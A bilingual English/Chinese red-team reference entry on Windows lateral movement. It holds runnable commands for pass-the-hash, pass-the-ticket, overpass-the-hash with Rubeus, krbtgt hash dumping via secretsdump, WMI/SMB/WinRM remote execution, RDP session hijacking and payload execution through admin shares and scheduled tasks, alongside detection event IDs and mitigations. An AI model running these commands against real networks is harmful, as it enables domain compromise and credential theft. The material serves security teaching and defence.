---
id: windows-lateral-movement
title_en: Windows Lateral Movement
title_zh: Windows 横向移动
summary_en: Every lateral movement technique is really a question about what you hold — a password, an NTLM hash, a ticket or a certificate — and what the target will accept in place of one. Choosing the method is choosing which log entry you leave.
summary_zh: 每一种横向移动手法本质上都在回答两个问题：你手里握着什么 —— 口令、NTLM 哈希、票据还是证书 —— 以及目标接受什么来替代它。选手法，就是选你留下哪一条日志。
tags: [windows, lateral-movement, active-directory, pass-the-hash, kerberos, red-team]
tools: [impacket, netexec, evil-winrm, Rubeus, mimikatz]
attck: [T1021.002, T1021.001, T1021.003, T1550.002]
platform: [windows]
difficulty: intermediate
updated: 2026-10-08
---

<!-- lang:en -->
### Start from what you hold

Lateral movement is not a list of tools, it is a mapping from credential to protocol. Get this table right and the tool choice becomes obvious.

| You hold | You can | Because |
|---|---|---|
| Cleartext password | Anything, including Kerberos | It derives every key |
| NTLM hash | Pass-the-Hash over SMB, WMI, WinRM (if not Kerberos-only) | NTLM accepts the hash directly |
| AES key / Kerberos ticket | Pass-the-Ticket, overpass-the-hash | Kerberos accepts the ticket |
| Certificate (AD CS) | PKINIT → TGT → anything | Kerberos accepts the certificate |
| A session on one host | Token impersonation, then the above | You inherit what that host holds |

Two constraints shape everything: **is NTLM still allowed** in the environment, and **which protocols reach the target**. A host that only accepts Kerberos kills pass-the-hash; a host with SMB closed but WinRM open changes the method, not the outcome.

### Step 1 — Validate and map

```bash
# who does this credential work for, and where
nxc smb 10.10.10.0/24 -u jdoe -p 'Summer2026!' --continue-on-success
nxc smb 10.10.10.0/24 -u jdoe -H <NThash> --continue-on-success

# what can this account do once it lands
nxc winrm 10.10.10.0/24 -u jdoe -p 'Summer2026!'
nxc ldap dc01.corp.local -u jdoe -p 'Summer2026!' --admin-count
```

BloodHound answers the "where is it worth going" question; these answer "can I get there at all".

### Step 2 — The SMB family

`impacket` gives you the same access through different Windows mechanisms, and the differences matter more for detection than for capability:

| Tool | Mechanism | Leaves behind |
|---|---|---|
| `psexec.py` | Uploads a service binary, starts it | Service creation (7045), a file on disk, `PSEXESVC` |
| `smbexec.py` | Creates a service whose binary is `cmd.exe` | Service creation, unusual service command line |
| `atexec.py` | Schedules a task | Task creation (4698), task scheduler events |
| `wmiexec.py` | WMI `Win32_Process.Create` | WMI activity, `WmiPrvSE` as parent, no service |
| `dcomexec.py` | DCOM object activation | DCOM/MMC20.Application events |

```bash
# the quietest of the batch for a single command
impacket-wmiexec corp.local/jdoe:'Summer2026!'@10.10.10.20

# pass-the-hash variant, no password needed
impacket-wmiexec -hashes :<NThash> corp.local/jdoe@10.10.10.20

# interactive-ish shell over SMB
impacket-smbexec corp.local/jdoe:'Summer2026!'@10.10.10.20
```

Rule of thumb: `wmiexec` for one-off commands (least artefacts), `psexec` when you need a full session and can afford the noise, `atexec` when you want a delay or a scheduled action anyway.

### Step 3 — Pass-the-Hash and pass-the-ticket

```bash
# NTLM hash straight into SMB
impacket-psexec -hashes :<NThash> corp.local/administrator@10.10.10.20

# harvest tickets, then use them
impacket-secretsdump -just-dc-user krbtgt corp.local/jdoe:'Summer2026!'@dc01

# on a Windows host: overpass-the-hash (NTLM hash → Kerberos TGT)
.\Rubeus.exe asktgt /user:administrator /rc4:<NThash> /ptt
.\Rubeus.exe asktgt /user:administrator /aes256:<AESkey> /ptt
```

`/aes256` is quieter than `/rc4`: RC4 ticket requests are the ones blue teams alert on, and modern environments encrypt with AES anyway. Pass-the-ticket then works anywhere Kerberos does — including hosts where NTLM has been disabled, which is exactly why hardening guides push "disable NTLM" rather than "block SMB".

### Step 4 — WinRM, RDP and the rest

```bash
# WinRM: PowerShell Remoting under the hood, port 5985/5986
evil-winrm -i 10.10.10.20 -u jdoe -p 'Summer2026!'
evil-winrm -i 10.10.10.20 -u jdoe -H <NThash>

# RDP without a password prompt, from Linux
xfreerdp /u:jdoe /p:'Summer2026!' /v:10.10.10.20 /cert:ignore
```

On a host you already control, RDP session hijacking is often the shortest path to an administrator's desktop:

```cmd
query user
tscon <session_id> /dest:<your_session>
```

Other options worth knowing: **SSH** on modern Windows, **VNC** where someone installed it, **PsExec from a Windows host**, and **WinRM over HTTPS** when the plain port is blocked.

### Step 5 — Remote execution through admin shares and tasks

```powershell
# copy then execute — the pattern most detections are built around
copy payload.exe \\10.10.10.20\C$\Windows\Temp\
schtasks /create /S 10.10.10.20 /TN upd /TR C:\Windows\Temp\payload.exe /SC ONCE /ST 23:59
schtasks /run /S 10.10.10.20 /TN upd
```

Admin shares (`C$`, `ADMIN$`) are reachable by any local administrator, which is why "this account is local admin on twelve hosts" is the finding that ends an engagement.

### Detection

Every technique above has a log line, and the correlation is stronger than any single rule:

- **4624 type 3** (network logon) on the target, with a source workstation that does not match the account's normal pattern.
- **7045** (service installed) — PsExec, smbexec and any service-based execution.
- **4698/4702** (scheduled task created/updated) with a command line pointing at `Temp`, `ProgramData`, or a share.
- **4688** process creation showing `WmiPrvSE.exe` or `wmiprvse.exe` as the parent of `cmd.exe` or `powershell.exe` — the WMI execution signature.
- **5140/5145** (network share access) to `ADMIN$` or `C$` followed quickly by service or task creation on the same host.
- **4648** (explicit credential logon) and Kerberos **4768/4769** with RC4 encryption — overpass-the-hash.
- **Remote interactive logon (4624 type 10)** for RDP, plus **4778/4779** session events; `tscon` shows up as a session reconnect.
- NTLM authentication where the environment is supposed to be Kerberos-only (4776).

The useful detection is a *sequence*: share access → service or task creation → process start, within seconds, from a workstation that never administers that server.

### Mitigation

- **Tier your administration.** Domain admins log into domain controllers and nothing else; workstation admins never touch servers. Most lateral movement exists because one credential works everywhere.
- **LAPS** so local administrator passwords differ per host — this breaks pass-the-hash across a fleet in one step.
- **Disable NTLM** where possible, and restrict it where not; require Kerberos and enforce AES to kill RC4-based techniques.
- **Protected Users** for privileged accounts: no NTLM, no delegation, no cached credentials.
- **Restrict admin shares and remote management protocols** to jump hosts, and require those jump hosts for administration.
- **PowerShell logging** (script block, module, transcription) plus **Sysmon** with a reviewed configuration; WMI activity and service creation are only visible if someone is collecting them.
- **Credential Guard** on workstations to protect the secrets an attacker would steal next.
- **Remove local admin rights** from ordinary users and service accounts, and audit the group memberships that grant them.

<!-- lang:zh -->
### 从"你手里有什么"开始

横向移动不是一张工具清单，而是"凭据 → 协议"的映射。把下面这张表搞对，工具选择自然就清楚了。

| 你手里有 | 你能做 | 原因 |
|---|---|---|
| 明文口令 | 几乎一切，包括 Kerberos | 它能派生出所有密钥 |
| NTLM 哈希 | 通过 SMB、WMI、WinRM 做 Pass-the-Hash（若环境未禁 NTLM） | NTLM 直接接受哈希 |
| AES 密钥 / Kerberos 票据 | Pass-the-Ticket、overpass-the-hash | Kerberos 接受票据 |
| 证书（AD CS） | PKINIT → TGT → 为所欲为 | Kerberos 接受证书 |
| 某台主机上的会话 | 令牌模拟，然后接上面任意一条 | 你继承那台主机持有的东西 |

两个约束决定一切：**这个环境还允许 NTLM 吗**，以及**哪些协议能到目标**。只接受 Kerberos 的主机会直接掐死 pass-the-hash；SMB 关着但 WinRM 开着，改变的是手法，不是结果。

### 第一步 —— 验证凭据并画图

```bash
# 这个凭据对谁有效、在哪些机器上有效
nxc smb 10.10.10.0/24 -u jdoe -p 'Summer2026!' --continue-on-success
nxc smb 10.10.10.0/24 -u jdoe -H <NThash> --continue-on-success

# 落地之后这个账号能干什么
nxc winrm 10.10.10.0/24 -u jdoe -p 'Summer2026!'
nxc ldap dc01.corp.local -u jdoe -p 'Summer2026!' --admin-count
```

BloodHound 回答"哪里值得去"，上面这些命令回答"我到底能不能到那儿"。

### 第二步 —— SMB 家族

`impacket` 让你通过不同的 Windows 机制拿到同样的访问权限，而这些差异对**检测**比对手感更重要：

| 工具 | 机制 | 留下什么 |
|---|---|---|
| `psexec.py` | 上传服务二进制并启动 | 服务创建（7045）、磁盘上落文件、`PSEXESVC` |
| `smbexec.py` | 创建一个二进制为 `cmd.exe` 的服务 | 服务创建、异常的服务命令行 |
| `atexec.py` | 创建计划任务 | 任务创建（4698）、任务计划程序事件 |
| `wmiexec.py` | WMI 的 `Win32_Process.Create` | WMI 活动、父进程是 `WmiPrvSE`、无服务 |
| `dcomexec.py` | DCOM 对象激活 | DCOM / MMC20.Application 事件 |

```bash
# 单条命令最安静的一个
impacket-wmiexec corp.local/jdoe:'Summer2026!'@10.10.10.20

# pass-the-hash 变体，不需要口令
impacket-wmiexec -hashes :<NThash> corp.local/jdoe@10.10.10.20

# 近似交互的 SMB shell
impacket-smbexec corp.local/jdoe:'Summer2026!'@10.10.10.20
```

经验法则：一次性命令用 `wmiexec`（痕迹最少），需要完整会话且能接受噪音用 `psexec`，本来就想留个延迟动作或计划任务用 `atexec`。

### 第三步 —— Pass-the-Hash 与 Pass-the-Ticket

```bash
# 直接把 NTLM 哈希喂给 SMB
impacket-psexec -hashes :<NThash> corp.local/administrator@10.10.10.20

# 先收割票据，再用
impacket-secretsdump -just-dc-user krbtgt corp.local/jdoe:'Summer2026!'@dc01

# 在 Windows 主机上做 overpass-the-hash（NTLM 哈希 → Kerberos TGT）
.\Rubeus.exe asktgt /user:administrator /rc4:<NThash> /ptt
.\Rubeus.exe asktgt /user:administrator /aes256:<AESkey> /ptt
```

`/aes256` 比 `/rc4` 安静：RC4 的票据请求正是蓝队告警的对象，而且现代环境本来就用 AES 加密。之后 Pass-the-Ticket 在 Kerberos 能用的地方都能用 —— 包括已经禁用 NTLM 的主机，这也正是加固指南推"禁用 NTLM"而不是"封 SMB"的原因。

### 第四步 —— WinRM、RDP 以及其余

```bash
# WinRM：底层就是 PowerShell Remoting，端口 5985/5986
evil-winrm -i 10.10.10.20 -u jdoe -p 'Summer2026!'
evil-winrm -i 10.10.10.20 -u jdoe -H <NThash>

# 从 Linux 直接 RDP，不弹口令提示
xfreerdp /u:jdoe /p:'Summer2026!' /v:10.10.10.20 /cert:ignore
```

在你已经控制的主机上，RDP 会话劫持常常是通往管理员桌面最短的路：

```cmd
query user
tscon <session_id> /dest:<your_session>
```

其他值得知道的：现代 Windows 上的 **SSH**、有人装过的 **VNC**、从 Windows 主机发起的 **PsExec**，以及明文端口被封时的 **HTTPS 版 WinRM**。

### 第五步 —— 通过管理共享与任务远程执行

```powershell
# 先拷再执行 —— 大多数检测规则就是围绕这个模式建的
copy payload.exe \\10.10.10.20\C$\Windows\Temp\
schtasks /create /S 10.10.10.20 /TN upd /TR C:\Windows\Temp\payload.exe /SC ONCE /ST 23:59
schtasks /run /S 10.10.10.20 /TN upd
```

管理共享（`C$`、`ADMIN$`）对任何本地管理员都开放 —— 这就是为什么"这个账号在十二台机器上是本地管理员"往往是一个项目收尾的发现。

### 检测

上面每一种手法都会留日志，而**关联**比任何单条规则都强：

- 目标机上的 **4624 类型 3**（网络登录），且来源工作站与该账号的日常行为不符。
- **7045**（服务被安装）—— PsExec、smbexec 以及任何基于服务的执行。
- **4698/4702**（计划任务创建/更新），命令行指向 `Temp`、`ProgramData` 或某个共享。
- **4688** 进程创建里，`cmd.exe` 或 `powershell.exe` 的父进程是 `WmiPrvSE.exe` —— WMI 执行的签名特征。
- **5140/5145**（网络共享访问）命中 `ADMIN$` 或 `C$`，紧接着同一台主机上出现服务或任务创建。
- **4648**（显式凭据登录）与使用 RC4 的 Kerberos **4768/4769** —— overpass-the-hash。
- RDP 的**远程交互登录（4624 类型 10）**，以及 **4778/4779** 会话事件；`tscon` 表现为一次会话重连。
- 在一个本应只用 Kerberos 的环境里出现 NTLM 认证（4776）。

真正有用的检测是**序列**：共享访问 → 服务或任务创建 → 进程启动，几秒之内完成，而且来自一台从不管理那台服务器的工作站。

### 缓解

- **管理分层。** 域管只登录域控，不碰别的；工作站管理员永远不碰服务器。大多数横向移动之所以存在，就是因为一个凭据到处都能用。
- **LAPS** 让每台机器的本地管理员口令各不相同 —— 这一步就能让整片机群上的 pass-the-hash 失效。
- **尽可能禁用 NTLM**，做不到就严格限制；要求 Kerberos 并强制 AES，压掉基于 RC4 的手法。
- 特权账户加入 **Protected Users**：禁 NTLM、禁委派、不缓存凭据。
- **把管理共享与远程管理协议限制到跳板机**，并要求管理操作必须经过跳板机。
- **PowerShell 日志**（脚本块、模块、转录）配合**经审阅配置的 Sysmon**；WMI 活动和服务创建只有在有人收集时才看得见。
- 工作站启用 **Credential Guard**，保护攻击者接下来想偷的那些机密。
- **收回普通用户与服务账户的本地管理员权限**，并审计授予这些权限的组成员关系。
